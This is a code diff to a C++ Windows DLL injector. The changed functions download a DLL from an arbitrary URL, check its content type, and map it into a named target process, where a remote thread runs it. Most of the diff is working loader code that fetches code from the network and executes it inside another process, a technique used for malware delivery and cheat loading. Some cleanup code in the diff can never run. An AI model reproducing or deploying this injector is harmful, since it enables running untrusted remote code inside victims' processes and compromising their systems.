@@ -1,7 +1,10 @@
 #include <iostream>
+#include <string>
 #include "stdafx.hpp"
 #include <Windows.h>
 #include <TlHelp32.h>
+#include <stdexcept>
+#include <vector>
 
 #include <wininet.h>
 #pragma comment(lib, "Wininet")
@@ -188,61 +191,131 @@ BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
 	return TRUE;
 }
 
+bool isDllContentType(const std::wstring& contentType) {
+
+	std::vector<std::wstring> dllContentTypes = {
+		L"application/octet-stream",
+		L"application/x-msdownload",
+		L"application/x-dosexec",
+		L"application/x-executable",
+		L"application/x-dll",
+		L"application/x-win32-microsoftdll",
+		L"application/vnd.microsoft.portable-executable",
+		L"application/x-msdos-program"
+	};
+
+	for (const std::wstring& dllType : dllContentTypes) {
+		if (contentType == dllType) {
+			return true;
+		}
+	}
+
+	return false;
+}
+
+bool verifyDll(LPCSTR dllUrl)
+{
+	HINTERNET hInternet, hConnect;
+
+	hInternet = InternetOpen("Loader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
+	if (!hInternet)
+	{
+		return false;
+	}
+
+	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT;
+	hConnect = InternetOpenUrl(hInternet, dllUrl, NULL, 0, flags, 0);
+
+	if (!hConnect)
+	{
+		return false;
+	}
+
+	DWORD disableDecoding = 1;
+	InternetSetOption(hConnect, INTERNET_OPTION_HTTP_DECODING, &disableDecoding, sizeof(DWORD));
+
+	WCHAR contentType[MAX_PATH];
+	DWORD contentTypeSize = sizeof(contentType);
+
+	bool result = false;
+
+	if (HttpQueryInfoW(hConnect, HTTP_QUERY_CONTENT_TYPE, contentType, &contentTypeSize, NULL))
+	{
+		if (isDllContentType(contentType)) {
+			result = true;
+		}
+	}
+
+	InternetCloseHandle(hConnect);
+	InternetCloseHandle(hInternet);
+
+	return result;
+
+}
+
 PVOID remoteDownloadDll(LPCSTR dllUrl, DWORD& dllSize) {
-	HINTERNET hInternet = InternetOpen("WinINet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	HINTERNET hInternet, hConnect;
+
+	hInternet = InternetOpen("Loader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
 	if (hInternet) {
 		// Open URL
-		try {
-			HINTERNET hConnect = InternetOpenUrl(hInternet, dllUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
-
-			if (hConnect) {
-				std::vector<char> dllBuffer;
-				DWORD bytesRead = 0;
-				char buffer[1024];
-
-				// Reading DLL Bytes
-				while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
-					dllBuffer.insert(dllBuffer.end(), buffer, buffer + bytesRead);
-				}
-
-				// Close Connection
-				InternetCloseHandle(hConnect);
-
-				// Close WinINet Library
-				InternetCloseHandle(hInternet);
-
-				// Calcule DLL Length
-				dllSize = static_cast<DWORD>(dllBuffer.size());
-
-				// Create buffer and copy DLL bytes
-				PVOID dllData = malloc(dllSize);
-				if (dllData) {
-					memcpy(dllData, dllBuffer.data(), dllSize);
-					return dllData;
-				}
-				else {
-					std::cout << "[-] Fail to allocate bytes to buffer." << std::endl;
-				}
-			}
-			else {
-				std::cout << "[-] Fail to open URL: " << GetLastError() << std::endl;
+		hConnect = InternetOpenUrl(hInternet, dllUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
 			
-			}
-
-			// Close WinINet Library
-			InternetCloseHandle(hInternet);
+		if (!hConnect)
+		{
+			throw std::runtime_error("Fail to open URL");
 		}
-		catch (const std::exception& e) {
-			std::cout << "[-] Invalid URL: " << dllUrl << std::endl;
-			system("PAUSE");
+
+		if (!verifyDll(dllUrl))
+		{
+			throw std::runtime_error("Invalid DLL");
+		}
+
+		std::vector<char> dllBuffer;
+		DWORD bytesRead = 0;
+		char buffer[1024];
+
+		// Reading DLL Bytes
+		while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+			dllBuffer.insert(dllBuffer.end(), buffer, buffer + bytesRead);
+		}
+
+		// Close Connection
+		InternetCloseHandle(hConnect);
+
+		// Close WinINet Library
+		InternetCloseHandle(hInternet);
+
+		// Calcule DLL Length
+		dllSize = static_cast<DWORD>(dllBuffer.size());
+
+		// Create buffer and copy DLL bytes
+		PVOID dllData = malloc(dllSize);
+		if (dllData) {
+			memcpy(dllData, dllBuffer.data(), dllSize);
+			return dllData;
+		}
+		else {
+			throw std::runtime_error("Fail to allocate bytes to buffer.");
+		}
+
+		// Close WinINet Library
+		InternetCloseHandle(hInternet);
+
+		if (hConnect) {
+			InternetCloseHandle(hConnect);
+		}
+
+		if (hInternet) {
+			InternetCloseHandle(hInternet);
 		}
 	}
 	else {
-		std::cout << "[-] Fail to start WinInet." << std::endl;
-		system("PAUSE");
+		std::cerr << "Fail to start WinInet." << std::endl;
+		return nullptr;
 	}
-
-	return nullptr; // Return nullptr
 }
 
 
@@ -272,12 +345,12 @@ int injector(LPCSTR dllUrl, LPCSTR processName, bool waitWindow = false)
 		} while (true);
 	}
 
-	loaderdata LoaderParams;
-
-	// Download Remote DLL
-	DWORD dllSize;
-	
 	try {
+		loaderdata LoaderParams;
+
+		// Download Remote DLL
+		DWORD dllSize;
+
 		PVOID FileBuffer = remoteDownloadDll(dllUrl, dllSize);
 
 		// Target Dll's DOS Header
@@ -335,19 +408,18 @@ int injector(LPCSTR dllUrl, LPCSTR processName, bool waitWindow = false)
 
 		// Wait for the loader to finish executing
 		WaitForSingleObject(hThread, INFINITE);
-	}
-	catch (const std::exception& e) {
-		std::cout << "[-] Error with dll injection." << std::endl;
-		std::cout << "Process Name: " << processName << std::endl;
-		std::cout << "DLL URL: " << dllUrl << std::endl;
-		
-		system("PAUSE");
+	} catch (const std::exception& e) {
 
-		ExitProcess(0);
+		std::cerr << "[-] Error with dll injection." << std::endl;
+		std::cerr << "[-] Error: " << e.what() << std::endl;
+		std::cerr << "[!] Process Id: " << ProcessId << std::endl;
+		std::cerr << "[!] DLL URL: " << dllUrl << std::endl;
+		
+		return EXIT_FAILURE;
 	}
 
 	// free the allocated loader code
 	// VirtualFreeEx(hProcess, LoaderMemory, 0, MEM_RELEASE);
 
-	return 0;
+	return EXIT_SUCCESS;
 }
